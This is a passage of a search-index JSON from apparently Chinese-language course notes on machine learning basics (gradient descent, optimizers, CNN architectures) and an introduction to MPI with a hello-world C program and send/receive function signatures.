\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516b\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e94\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516b\u6b21\u8bfe\u8bfe\u4ef6","title":"\u673a\u5668\u5b66\u4e60\u57fa\u7840"},{"location":"hpc/hpc101/ml/#_2","text":"","title":"\u673a\u5668\u5b66\u4e60\u57fa\u7840"},{"location":"hpc/hpc101/ml/#_3","text":"\u4e00\u7ef4\uff1a \\(\\hat{y} = wx + b\\) N \u7ef4\uff1a \\(\\hat{y} = \\mathbf{w}^\\top\\mathbf{x} + b\\) \u635f\u5931\u51fd\u6570\uff1a \\(l^{(i)}(\\mathbf{w}, b) = \\dfrac{1}{2}(\\hat{y}^{(i)}-y^{(i)})^2\\) \u68af\u5ea6\u4e0b\u964d\u6cd5\u6c42\u89e3\u53c2\u6570","title":"\u7ebf\u6027\u56de\u5f52"},{"location":"hpc/hpc101/ml/#_4","text":"\\(L(\\mathbf{w}, b) = \\sum_il^{(i)}(\\mathbf{w}, b)\\) \u7528 \\((\\mathbf{w}, b)-\\eta\\nabla L(\\mathbf{w}, b)\\) \u4ee3\u66ff \\((\\mathbf{w}, b)\\) \u5b66\u4e60\u7387 \\(\\eta\\) \uff0c\u8d85\u53c2\u6570\uff08\u7528\u6765\u63a7\u5236\u5b66\u4e60\uff09\uff0c\u4e0b\u964d\u7684\u5feb\u6162 \u5b66\u4e60\u7387\u8fc7\u5927\u4f1a\u5728\u6700\u4f18\u9644\u8fd1\u6a2a\u8df3 \u5b66\u4e60\u7387\u8fc7\u5c0f\u5219\u592a\u6162 \u6839\u636e\u8fdb\u5ea6\u66f4\u6539\u5b66\u4e60\u7387 Linear Decay Linear Warmup\uff1a\u5148\u5c0f\uff0c\u7136\u540e\u589e\u5927\uff0c\u518d\u7f13\u6162\u53d8\u5c0f","title":"\u68af\u5ea6\u4e0b\u964d"},{"location":"hpc/hpc101/ml/#sgd","text":"Minibatch S tochastic G radient D escent \u968f\u673a\u91c7\u7528\u4e00\u90e8\u5206\u6837\u672c\u6765\u8ba1\u7b97\u635f\u5931\u51fd\u6570 \\(L(\\mathbf{w}, b) = \\sum_{i\\in B}l^{(i)}(\\mathbf{w}, b)\\) Batch size \\(s=|B|\\) \u4e5f\u662f\u4e00\u4e2a\u8d85\u53c2\u6570 \\(s\\) \u5c0f\uff0c\u5de5\u4f5c\u91cf\u5c0f\uff0c\u62df\u5408\u6548\u679c\u4e0d\u597d \\(s\\) \u5927\uff0c\u5185\u5b58\u6d88\u8017\u9ad8","title":"SGD"},{"location":"hpc/hpc101/ml/#_5","text":"","title":"\u6df1\u5ea6\u5b66\u4e60\u57fa\u7840"},{"location":"hpc/hpc101/ml/#_6","text":"\u591a\u5c42\u611f\u77e5\u5668\uff08Multilayer Perceptrons\uff0c MLP\uff09\u662f\u4e00\u79cd\u524d\u5411\u7ed3\u6784\u7684\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc\uff0c\u7ed3\u6784\u4f8b\u5982\uff1a \u8f93\u5165\u5c42\uff08Input Layer\uff09\uff1a \\(\\mathbf{x}\\in\\mathbb{R}^n\\) \u9690\u85cf\u5c42\uff08Hidden Layer\uff09\uff1a \\(\\mathbf{h} = \\sigma(\\mathbf{W_1x}+\\mathbf{b_1})\\) \\(\\mathbf{W_1}\\in\\mathbb{R}^{m\\times n}, \\mathbf{b_1}\\in\\mathbb{R}^m, \\mathbf{h}\\in\\mathbb{R}^m\\) \\(\\sigma\\) \uff1a\u6fc0\u6d3b\u51fd\u6570\uff08activation function\uff09 \u53ef\u4ee5\u6709\u5f88\u591a\u9690\u85cf\u5c42\uff0c\u9010\u5c42\u4f20\u9012 \u8f93\u51fa\u5c42\uff08Output Layer\uff09\uff1a \\(\\mathbf{o} = \\mathbf{W_2h}+\\mathbf{b_2}\\) \\(\\mathbf{W_2}\\in\\mathbb{R}^{k\\times m}, \\mathbf{b_2}\\in\\mathbb{R}^k, \\mathbf{o}\\in\\mathbb{R}^k\\) \u7ed3\u679c\uff1a \\(\\mathbf{\\hat{y}}=\\sigma_2(\\mathbf{o})\\)","title":"\u591a\u5c42\u611f\u77e5\u5668"},{"location":"hpc/hpc101/ml/#forward-propagation","text":"\u6309\u987a\u5e8f\u4ece\u8f93\u5165\u5c42\u5f00\u59cb\u8ba1\u7b97\uff0c\u5f97\u5230\u6bcf\u4e00\u5c42\u7684\u8f93\u51fa\u7ed3\u679c","title":"\u524d\u5411\u4f20\u64ad\uff08Forward Propagation\uff09"},{"location":"hpc/hpc101/ml/#back-propagation","text":"\u5229\u7528\u94fe\u5f0f\u6cd5\u5219\u6765\u8ba1\u7b97\u795e\u7ecf\u7f51\u7edc\u4e2d\u5404\u53c2\u6570\u7684\u68af\u5ea6","title":"\u53cd\u5411\u4f20\u64ad\uff08Back Propagation\uff09"},{"location":"hpc/hpc101/ml/#_7","text":"\u6ca1\u6709\u6fc0\u6d3b\u51fd\u6570\u7684\u60c5\u51b5\uff1a \\(\\mathbf{h} = \\mathbf{W_1x}+\\mathbf{b_1}\\) \\(\\mathbf{o} = \\mathbf{W_2h}+\\mathbf{b_2} = \\mathbf{W_1W_2x}+\\mathbf{b_1}+\\mathbf{b_2}\\) \u4ecd\u4e3a\u7ebf\u6027\u7684 \u800c\u6fc0\u6d3b\u51fd\u6570\u4f7f\u5f97 \\(\\mathbf{h} = \\sigma(\\mathbf{W_1x}+\\mathbf{b_1})\\) \uff0c\u8ba9 MLP \u53d8\u4e3a\u975e\u7ebf\u6027\u7684 \u4e00\u4e9b\u6fc0\u6d3b\u51fd\u6570\uff1a sigmoid \uff1a \\(\\text{sigmoid}(x) = \\dfrac{1}{1+e^{-x}}\\) \uff0c\u5bfc\u6570\uff1a \\(\\text{sigmoid}(x)(1-\\text{sigmoid}(x))\\) tanh \uff1a \\(\\tanh(x) = \\dfrac{1-e^{-2x}}{1+e^{-2x}}\\) \uff0c\u5bfc\u6570\uff1a \\(1-\\tanh^2(x)\\) ReLU \uff1a \\(\\text{ReLU}(x)=\\max(x, 0)\\) Re ctified L inear U nit \u5c4f\u853d\u6389\u8d1f\u503c softmax \uff1a \\(\\text{softmax}(\\mathbf{o})_i = \\dfrac{e^{o_i}}{\\sum_{j=1}^ke^{o_j}}\\) \u5c06\u8f93\u51fa\u7684\u503c\u8f6c\u5316\u4e3a\u6982\u7387\uff08\u548c\u4e3a 1\uff09","title":"\u6fc0\u6d3b\u51fd\u6570"},{"location":"hpc/hpc101/ml/#_8","text":"#TODO\uff0cPPT 55-59 \u9875\uff0c\u6ca1\u61c2","title":"\u89c4\u8303\u5316"},{"location":"hpc/hpc101/ml/#_9","text":"SGD\uff1a \\(W\\leftarrow W-\\eta\\nabla L(W)\\)","title":"\u4f18\u5316\u7b97\u6cd5"},{"location":"hpc/hpc101/ml/#sgd-momentum","text":"SGD \u53ea\u4f9d\u8d56\u5f53\u524d batch \u8ba1\u7b97\u5f97\u5230\u7684\u68af\u5ea6\u6765\u66f4\u65b0\uff0c\u4e0d\u7a33\u5b9a\u3002\u5728\u68af\u5ea6\u4e0b\u964d\u8fc7\u7a0b\u4e2d\u52a0\u5165\u52a8\u91cf\uff0c\u7d2f\u79ef\u5386\u6b21\u8ba1\u7b97\u7684\u68af\u5ea6\uff0c\u4f7f\u4e4b\u66f4\u7a33\u5b9a\uff0c\u800c\u4e14\u9632\u6b62\u9677\u5165\u5c40\u90e8\u6700\u4f18\u89e3 \\(v\\leftarrow \\rho v+\\nabla L(W)\\) \\(v\\) \uff1a\"velocity\"\uff0c\u7d2f\u79ef\u7684\u68af\u5ea6 \\(\\rho\\) \uff1a\"friction\"\uff0c\u52a8\u91cf\u56e0\u5b50\uff0c\u4e00\u822c\u4e3a 0.9 \u6216 0.99 \\(W\\leftarrow W-\\eta v\\)","title":"SGD + Momentum"},{"location":"hpc/hpc101/ml/#adagrad","text":"\u8bbe\u7f6e\u5168\u5c40\u5b66\u4e60\u7387\u4e4b\u540e\uff0c\u6bcf\u6b21\u901a\u8fc7\u5168\u5c40\u5b66\u4e60\u7387\u9010\u53c2\u6570\u7684\u9664\u4ee5\u5386\u53f2\u68af\u5ea6\u5e73\u65b9\u548c\u7684\u5e73\u65b9\u6839\u4f7f\u5f97\u6bcf\u4e2a\u53c2\u6570\u7684\u5b66\u4e60\u7387\u4e0d\u540c \u5728\u53c2\u6570\u7a7a\u95f4\u66f4\u4e3a\u5e73\u7f13\u7684\u65b9\u5411\uff0c\u4f1a\u53d6\u5f97\u66f4\u5927\u7684\u8fdb\u6b65\uff08\u56e0\u4e3a\u5e73\u7f13\uff0c\u6240\u4ee5\u5386\u53f2\u68af\u5ea6\u5e73\u65b9\u548c\u8f83\u5c0f\uff0c\u5bf9\u5e94\u5b66\u4e60\u4e0b\u964d\u7684\u5e45\u5ea6\u8f83\u5c0f\uff09\uff0c\u5e76\u4e14\u80fd\u591f\u4f7f\u5f97\u9661\u5ced\u7684\u65b9\u5411\u53d8\u5f97\u5e73\u7f13\uff0c\u4ece\u800c\u52a0\u5feb\u8bad\u7ec3\u901f\u5ea6 \\(s\\leftarrow s+(\\nabla L(W))^2\\) \\(s\\) \uff1a\u7d2f\u79ef\u5e73\u65b9\u68af\u5ea6 \u5e73\u65b9\u662f\u9010\u5143\u7d20\u76f8\u4e58 \\(W\\leftarrow W-\\dfrac{\\eta}{\\sqrt{s}+\\epsilon}\\nabla L(W)\\) \\(\\epsilon\\) \uff1a\u4e3a\u4e86\u7ef4\u6301\u6570\u503c\u7a33\u5b9a\u6027\uff0c\u4e00\u822c\u4e3a \\(10^{-6}\\) \u6216 \\(10^{-7}\\) \u4e4b\u7c7b\u5c0f\u5e38\u6570","title":"AdaGrad"},{"location":"hpc/hpc101/ml/#adam","text":"\u5bf9\u68af\u5ea6\u7684\u4e00\u9636\u77e9\u4f30\u8ba1\uff08First Moment Estimation\uff0c\u5373\u68af\u5ea6\u7684\u5747\u503c\uff09\u548c\u4e8c\u9636\u77e9\u4f30\u8ba1\uff08Second Moment Estimation\uff0c\u5373\u68af\u5ea6\u7684\u672a\u4e2d\u5fc3\u5316\u7684\u65b9\u5dee\uff09\u8fdb\u884c\u7efc\u5408\u8003\u8651\uff0c\u8ba1\u7b97\u51fa\u66f4\u65b0\u6b65\u957f\uff0c\u6548\u679c\u66f4\u597d \u8fed\u4ee3\u6b21\u6570\u8bb0\u4e3a \\(i=1, \\dots, n\\) \\(v\\leftarrow \\beta_1v+(1-\\beta_1)\\nabla L(W)\\) \\(s\\leftarrow \\beta_2s+(1-\\beta_2)(\\nabla L(W))^2\\) Bias correction\uff1a \\(v'=\\dfrac{v}{1-\\beta_1^i}, s'=\\dfrac{s}{1-\\beta_2^i}\\) \\(W\\leftarrow W-\\eta\\dfrac{v'}{\\sqrt{s'}+\\epsilon}\\) \u4e00\u822c\u60c5\u51b5\u4e0b\u901a\u5e38\u8bbe \\(\\beta_1=0.9, \\beta_2=0.999, \\eta=10^{-3}\\) \u6216 \\(5\\times 10^{-4}\\)","title":"Adam"},{"location":"hpc/hpc101/ml/#_10","text":"\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff08Convolutional Neural Network\uff0cCNN\uff09\u662f\u4e00\u7c7b\u5f3a\u5927\u7684\u3001\u4e3a\u5904\u7406\u56fe\u50cf\u6570\u636e\u800c\u8bbe\u8ba1\u7684\u795e\u7ecf\u7f51\u7edc","title":"\u5377\u79ef\u795e\u7ecf\u7f51\u7edc"},{"location":"hpc/hpc101/ml/#_11","text":"\u4e00\u7ef4\u5377\u79ef\uff1a \\[ (f*g)(x)=\\int_{-\\infty}^\\infty f(\\tau)g(t-\\tau)\\mathrm d\\tau \\] \u79bb\u6563\u5f62\u5f0f\uff1a \\[ (f*g)(n)=\\sum_{m=-\\infty}^\\infty f(m)g(n-m) \\] \u4e8c\u7ef4\u79bb\u6563\u5377\u79ef\uff1a \\[ (f*g)(i, j)=\\sum_a\\sum_bf(a, b)g(i-a, j-b) \\] \u56fe\u50cf\u5377\u79ef/\u4e92\u76f8\u5173\uff08cross-correlation\uff09 \u5e26 padding \u7684\u4e8c\u7ef4\u5377\u79ef \u5728\u5468\u56f4\u586b\u5145 \u53ef\u4ee5\u586b\u5145 0\uff0c\u4e5f\u53ef\u4ee5\u586b\u5145\u4e34\u8fd1\u7684\u6570 \u5e26\u6b65\u5e45\uff08stride\uff09\u7684\u4e8c\u7ef4\u5377\u79ef\uff08\u4e0b\u56fe\u6c34\u5e73\u6b65\u5e45\u4e3a 2\uff0c\u5782\u76f4\u6b65\u5e45\u4e3a 3\uff09 \u591a\u901a\u9053\u5377\u79ef\uff08\u4f1a\u964d\u7ef4\uff09 \u591a\u8f93\u51fa\u901a\u9053\u5377\u79ef\uff08\u5982\u56fe\u4e3a \\(1\\times 1\\) \u5377\u79ef\uff09","title":"\u5377\u79ef"},{"location":"hpc/hpc101/ml/#_12","text":"\u6c60\u5316\u5373 pooling\uff0c\u4e0e\u5377\u79ef\u5c42\u7c7b\u4f3c\uff0c\u53ea\u662f\u4e0d\u8fdb\u884c\u4e58\u6cd5\u64cd\u4f5c\uff0c\u4e5f\u4e0d\u9700\u8981\u6838\uff0c\u53ea\u662f\u901a\u8fc7\u7a97\u53e3\u5212\u5206\u533a\u57df\uff0c\u7136\u540e\u505a\u52a0\u6cd5/\u53d6\u6700\u5927\u503c/\u53d6\u5e73\u5747\u3002\u4f8b\u5982\u6700\u5927\u6c47\u805a\u5c42\uff1a \u6c47\u805a\u5c42\u4f5c\u7528\uff1a\u964d\u4f4e\u5377\u79ef\u5c42\u5bf9\u4f4d\u7f6e\u7684\u654f\u611f\u6027\uff0c\u540c\u65f6\u964d\u4f4e\u5bf9\u7a7a\u95f4\u964d\u91c7\u6837\u8868\u793a\u7684\u654f\u611f\u6027","title":"\u6c47\u805a\uff08\u6c60\u5316\uff09"},{"location":"hpc/hpc101/ml/#lenet","text":"1989 \u5e74\u63d0\u51fa\u7684 CNN \u6a21\u578b\uff08LeNet-5\uff09\uff0c\u7528\u6765\u4ece 28*28 \u7684\u8f93\u5165\u56fe\u7247\u4e2d\u8bc6\u522b\u6570\u5b57\uff0c\u7ed3\u6784\uff1a \u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a \u5377\u79ef\u7f16\u7801\u5668\uff1a\u6bcf\u4e2a\u5377\u79ef\u5757\u662f\u4e00\u4e2a\u5377\u79ef\u5c42\uff085*5 \u5377\u79ef\u6838\uff0cpadding \u4e3a 2\uff09\uff0c\u4e00\u4e2a sigmoid \u6fc0\u6d3b\u51fd\u6570\uff0c\u4e00\u4e2a\u5e73\u5747\u6c47\u805a\u5c42\uff082*2 \u6c60\uff0cstride \u4e3a 2\uff09 \u7b2c\u4e00\u5c42\u6709 6 \u4e2a\u901a\u9053\uff0c\u7b2c\u4e8c\u5c42\u6709 16 \u4e2a\u901a\u9053 \u5168\u8fde\u63a5\u5c42\u5bc6\u96c6\u5757\uff1a\u6709\u4e09\u4e2a\u5168\u8fde\u63a5\u5c42\uff08\u4e2d\u95f4\u662f sigmoid \u6fc0\u6d3b\u51fd\u6570\uff09 \u4e09\u4e2a\u5168\u8fde\u63a5\u5c42\u8f93\u51fa\u4e2a\u6570\u4f9d\u6b21\u4e3a 120\u300184\u300110\uff08\u6700\u7ec8 10 \u4e2a\u6570\u5b57\uff09","title":"LeNet"},{"location":"hpc/hpc101/ml/#_13","text":"","title":"\u73b0\u4ee3\u5377\u79ef\u795e\u7ecf\u7f51\u7edc"},{"location":"hpc/hpc101/ml/#alexnet","text":"\u548c LeNet \u7ed3\u6784\u548c\u8bbe\u8ba1\u7406\u5ff5\u7c7b\u4f3c\u3002\u8f93\u5165\u4e00\u4e2a 224*224 \u5e26\u4e09\u901a\u9053\u7684\u56fe\u7247\uff0c\u8f93\u51fa\u8bc6\u522b\u51fa\u7684\u7269\u4f53\u7c7b\u522b\uff08\u4e00\u5171 1000 \u79cd\uff09\uff0c\u7ed3\u6784\uff1a \u56fe\u7247\uff083*224*224\uff09-> 11*11 \u5377\u79ef\u5c42\uff0896 \u901a\u9053\uff0cstride 4\uff09-> 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-> 5*5 \u5377\u79ef\u5c42\uff08256 \u901a\u9053\uff0cpadding 2\uff09-> 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-> 3*3 \u5377\u79ef\u5c42\uff08384 \u901a\u9053\uff0cpadding 1\uff09-> 3*3 \u5377\u79ef\u5c42\uff08384 \u901a\u9053\uff0cpadding 1\uff09-> 3*3 \u5377\u79ef\u5c42\uff08256 \u901a\u9053\uff0cpadding 1\uff09-> 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-> \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 4096\uff09-> \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 4096\uff09-> \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 1000\uff09 \u6fc0\u6d3b\u51fd\u6570\u4f7f\u7528 ReLU","title":"AlexNet"},{"location":"hpc/hpc101/ml/#vgg","text":"\u4f7f\u7528\u4e86\u66f4\u5c0f\u7684\u5377\u79ef\u6838\uff083*3\uff09\u548c 2*2 \u7684\u6700\u5927\u6c47\u805a\u5c42\uff0c\u6709\u66f4\u6df1\u7684\u5c42\u7ea7\uff0816-19 \u5c42\uff09","title":"VGG"},{"location":"hpc/hpc101/ml/#googlenet","text":"\u4f7f\u7528\u4e86 Inception \u5757\uff1a","title":"GoogLeNet"},{"location":"hpc/hpc101/ml/#resnet","text":"\u5373\u6b8b\u5dee\u7f51\u7edc\uff0c\u4f7f\u7528\u4e86\u6b8b\u5dee\u5757\uff0c\u5b66\u4e60 \\(f(x)-x\\) \u6765\u786e\u4fdd \\(\\mathcal{F}_i\\subset\\mathcal{F}_{i+1}\\) \uff0c\u9010\u6b21\u6536\u655b\u5230\"\u771f\u5b9e\"\u51fd\u6570 \\(f^*\\)","title":"ResNet"},{"location":"hpc/hpc101/ml/#_14","text":"\u8fc1\u79fb\u5b66\u4e60\uff08Transfer Learning\uff09\u662f\u6307\u5728\u539f\u6709\u6570\u636e\u96c6\u8bad\u7ec3\u597d\u53c2\u6570\u540e\uff0c\u66f4\u6362\u6570\u636e\u96c6\u65f6\u53ea\u9700\u8981\u91cd\u65b0\u8bad\u7ec3\u5168\u8fde\u63a5\u90e8\u5206 \u5bf9\u4e8e\u5c0f\u6570\u636e\u96c6\uff0c\u4ec5\u521d\u59cb\u5316\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u5e76\u91cd\u65b0\u8bad\u7ec3\uff0c\u56fa\u5b9a\u5176\u5b83\u5c42\u53c2\u6570\uff0c\u53ea\u6539\u53d8\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u53c2\u6570 \u5bf9\u4e8e\u5927\u6570\u636e\u96c6\uff0c\u4ec5\u521d\u59cb\u5316\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u548c\u5168\u8fde\u63a5\u9690\u85cf\u5c42\uff0c\u56fa\u5b9a\u5176\u5b83\u5c42\u53c2\u6570\uff0c\u91cd\u65b0\u8bad\u7ec3","title":"\u8fc1\u79fb\u5b66\u4e60"},{"location":"hpc/hpc101/ml/#_15","text":"\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\uff08Recurrent Neural Network\uff0cRNN\uff09\u53ef\u4ee5\u66f4\u597d\u5730\u5904\u7406\u5e8f\u5217\u4fe1\u606f \u8fd9\u91cc\u672c\u5e94\u6709\u66f4\u591a\u5185\u5bb9\uff0c\u4f46\u662f\u61d2\u5f97\u5199\u4e86 _(:\u0437\u300d\u2220)_","title":"\u5faa\u73af\u795e\u7ecf\u7f51\u7edc"},{"location":"hpc/hpc101/mpi/","text":"MPI \u57fa\u7840 \u00b6 Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u56db\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u4ef6 MPI Tutorial MPI \u7b80\u4ecb \u00b6 MPI\uff08Message-Passing Interface\uff09\u662f\u4e00\u7ec4\u7528\u4e8e\u5e76\u884c\u5e94\u7528\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\u7684\u63a5\u53e3\u3002\u76ee\u524d\u6700\u65b0\u7684\u6807\u51c6\u4e3a MPI-4.0\uff082021.6.9\uff09 \u6709\u5f88\u591a\u5b9e\u73b0\uff0c\u6bd4\u5982 OpenMPI\u3001IntelMPI\uff08\u96c6\u6210\u5728 Intel oneAPI \u5957\u4ef6\u4e2d\uff09\u3001MPICH\u3001MVAPICH \u7b49 OpenMP \u5de5\u4f5c\u5728\u7edf\u4e00\u5185\u5b58\u4e0a\uff0c\u5373\u4efb\u610f\u4e00\u4e2a\u5904\u7406\u5668\u90fd\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u4efb\u610f\u4e00\u5757\u5185\u5b58 MPI \u5de5\u4f5c\u5728\u5206\u5e03\u5f0f\u5185\u5b58\u4e0a\uff0c\u5373\u4e00\u7ec4\u5904\u7406\u5668\u5171\u7528\u4e00\u5757\u5185\u5b58\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5176\u4ed6\u5730\u65b9\u7684\u5185\u5b58\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8fdb\u884c\u6570\u636e\u7684\u4f20\u8f93 \u7c7b\u6bd4\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u4e4b\u95f4\u7684\u5173\u7cfb\uff1a\u8fdb\u7a0b\u62e5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u5355\u5143\uff0c\u800c\u591a\u4e2a\u7ebf\u7a0b\u5171\u4eab\u5185\u5b58\uff1b\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u7ebf\u7a0b\uff1b\u7ebf\u7a0b\u9002\u7528\u4e8e\u591a\u6838\u60c5\u51b5\uff0c\u8fdb\u7a0b\u9002\u7528\u4e8e\u591a\u673a\u3001\u591a\u6838\u60c5\u51b5 hello world \u00b6 #include <mpi.h> #include <stdio.h> int main ( int argc , char ** argv ) { MPI_Init ( NULL , NULL ); int world_size ; MPI_Comm_size ( MPI_COMM_WORLD , & world_size ); int world_rank ; MPI_Comm_rank ( MPI_COMM_WORLD , & world_rank ); char processor_name [ MPI_MAX_PROCESSOR_NAME ]; int name_len ; MPI_Get_processor_name ( processor_name , & name_len ); printf ( \"Hello world from processor %s, rank %d out of %d processors \\n \" , processor_name , world_rank , world_size ); MPI_Finalize (); } MPI_Init \uff1a\u521b\u5efa MPI \u73af\u5883\uff0c\u53c2\u6570\u4e00\u822c\u6ca1\u7528\uff0c\u5728\u8fd9\u671f\u95f4\u4f1a\u521b\u5efa\u4e00\u4e2a\u901a\u8baf\u5668\uff08communicator\uff09MPI_COMM_WORLD MPI_Comm_size \uff1a\u6839\u636e MPI_COMM_WORLD \u6765\u8bfb\u53d6\u603b\u8fdb\u7a0b\u6570\u91cf MPI_Comm_rank \uff1a\u6839\u636e MPI_COMM_WORLD \u6765\u8bfb\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 rank\uff0c\u76f8\u5f53\u4e8e\u8fdb\u7a0b\u7f16\u53f7 MPI_Get_processor_name \uff1a\u83b7\u53d6\u5f53\u524d\u7a0b\u5e8f\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u8dd1\u5728\u7684\u5904\u7406\u5668\u540d\u5b57 MPI_Finalize \uff1a\u6e05\u7406 MPI \u73af\u5883 \u7f16\u8bd1\u8fd0\u884c\u5747\u4f7f\u7528 mpi \u63d0\u4f9b\u7684\u547d\u4ee4\uff1a mpicc code.c -o out mpirun -np 4 ./out \u5f00\u542f\u56db\u4e2a\u8fdb\u7a0b \u4e0d\u540c\u5b9e\u73b0\u7684 mpirun \u547d\u4ee4\u53c2\u6570\u4f1a\u6709\u4e0d\u540c \u5982\u679c\u4ee5 root \u8fd0\u884c\u9700\u8981\u5728 mpirun \u540e\u9762\u52a0 --allow-run-as-root \u70b9\u5bf9\u70b9\u901a\u4fe1 \u00b6 mpirun \u4f1a\u542f\u52a8\u591a\u4e2a\u8fdb\u7a0b\uff0c\u4e14\u8fdb\u7a0b\u4e4b\u95f4\u5185\u5b58\u4e92\u76f8\u4e0d\u5171\u4eab\u3002\u9700\u8981\u5728\u8fdb\u7a0b\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u5219\u9700\u8981\u8fdb\u884c\u901a\u4fe1\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u5c31\u662f\u70b9\u5bf9\u70b9\u901a\u4fe1\uff08Point-to-Point Communication\uff09 MPI \u7684\u901a\u4fe1\u8fc7\u7a0b\u5927\u81f4\u9700\u8981\u901a\u8fc7\u4e24\u4e2a\u6570\u7ec4\uff08\u5373 buffer\uff09\uff0c\u4e00\u4e2a\u5b58\u50a8\u53d1\u9001\u6570\u636e\uff0c\u4e00\u4e2a\u5b58\u50a8\u63a5\u6536\u6570\u636e\uff0c\u901a\u8fc7\u8c03\u7528\u4e00\u7cfb\u5217\u51fd\u6570\u5373\u53ef\u5b9e\u73b0\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1 \u8c03\u7528\u901a\u4fe1\u51fd\u6570\u540e\uff0c\u901a\u4fe1\u8bbe\u5907\uff08\u901a\u5e38\u662f\u7f51\u7edc\uff09\u5c31\u9700\u8981\u8d1f\u8d23\u628a\u4fe1\u606f\u4f20\u9012\u5230\u6b63\u786e\u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u662f\u67d0\u4e2a\u8fdb\u7a0b\u7684\u67d0\u4e2a\u63a5\u6536 buffer \u6709\u65f6\u5019 A \u9700\u8981\u4f20\u9012\u5f88\u591a\u4e0d\u540c\u7684\u6d88\u606f\u7ed9 B\u3002\u4e3a\u4e86\u8ba9 B \u80fd\u6bd4\u8f83\u65b9\u4fbf\u5730\u533a\u5206\u4e0d\u540c\u7684\u6d88\u606f\uff0cMPI \u8fd0\u884c\u53d1\u9001\u8005\u548c\u63a5\u53d7\u8005\u989d\u5916\u5730\u6307\u5b9a\u4e00\u4e9b\u4fe1\u606f ID\uff08\u6b63\u5f0f\u540d\u79f0\u662f\u6807\u7b7e\uff0ctags\uff09\u3002\u5f53 B \u53ea\u8981\u6c42\u63a5\u6536\u67d0\u79cd\u7279\u5b9a\u6807\u7b7e\u7684\u4fe1\u606f\u7684\u65f6\u5019\uff0c\u5176\u4ed6\u7684\u4e0d\u662f\u8fd9\u4e2a\u6807\u7b7e\u7684\u4fe1\u606f\u4f1a\u5148\u88ab\u7f13\u5b58\u8d77\u6765\uff0c\u7b49\u5230 B \u9700\u8981\u7684\u65f6\u5019\u624d\u4f1a\u7ed9B \u57fa\u7840\u901a\u4fe1\u51fd\u6570 \u00b6 MPI_Send \u00b6 int MPI_Send ( const void * buf , int count , MPI_Datatype datatype , int dest , int tag , MPI_Comm comm ) buf \u662f\u8981\u53d1\u9001\u7684 buffer \u7684\u9996\u5730\u5740 count \u662f buffer \u4e2d\u5143\u7d20\u7684\u4e2a\u6570 datatype \u8868\u793a\u53d1\u9001\u7684 buffer \u4e2d\u7684\u5143\u7d20\u7c7b\u578b \u5199\u6cd5\u4e00\u822c\u662f MPI_ <\u7c7b\u578b\u5927\u5199\uff0c\u4e0b\u5212\u7ebf\u5206\u9694> \uff0c\u4f8b\u5982 MPI_INT\u3001MPI_UNSIGNED_LONG_LONG dest \u662f\u53d1\u9001\u76ee\u6807\u7684 rank tag \u662f message tag comm \u662f communicator\uff0c\u4e00\u822c\u76f4\u63a5\u4f20 MPI_COMM_WORLD \u5373\u53ef MPI_Recv \u00b6 int MPI_Recv ( void * buf , int count , MPI_Datatype datatype , int source , int tag , MPI_Comm comm , MPI_Status * status ) buf \u662f\u8981\u5c06\u63a5\u6536\u5230\u7684\u5185\u5bb9\u5b58\u5165\u7684 buffer \u9996\u5730\u5740\uff08\u4f5c\u4e3a\u201c\u8f93\u51fa\u201d\uff09 count \u662f\u8981\u63a5\u6536\u7684 buffer \u5143\u7d20\u4e2a\u6570 datatype \u662f\u8981\u63a5\u6536\u7684 buffer \u4e2d\u5143\u7d20\u7c7b\u578b source \u662f\u63a5\u6536\u6765\u6e90\u7684 rank\uff08\u6216\u8005 MPI_ANY_SOURCE\uff09 tag \u662f message tag\uff08\u6216\u8005 MPI_ANY_TAG\uff09 comm \u662f communicator status \u662f\u63a5\u6536\u7684\u72b6\u6001\u7ed3\u6784\u4f53\uff08\u4f5c\u4e3a\u201c\u8f93\u51fa\u201d\uff09 \u4e0d\u9700\u8981\u65f6\u586b\u5199 MPI_STATUS_IGNORE MPI_Status \u4e2d\u5305\u542b\u4e09\u4e2a\u6210\u5458\u53d8\u91cf\uff1aMPI_SOURCE\u3001MPI_TAG\u3001MPI_ERROR \u53ef\u4ee5\u901a\u8fc7 MPI_Get_count(MPI_Status status, MPI_Datatype datatype, int count) \u51fd\u6570\u6765\u83b7\u53d6 count \u96c6\u5408\u901a\u4fe1 \u00b6 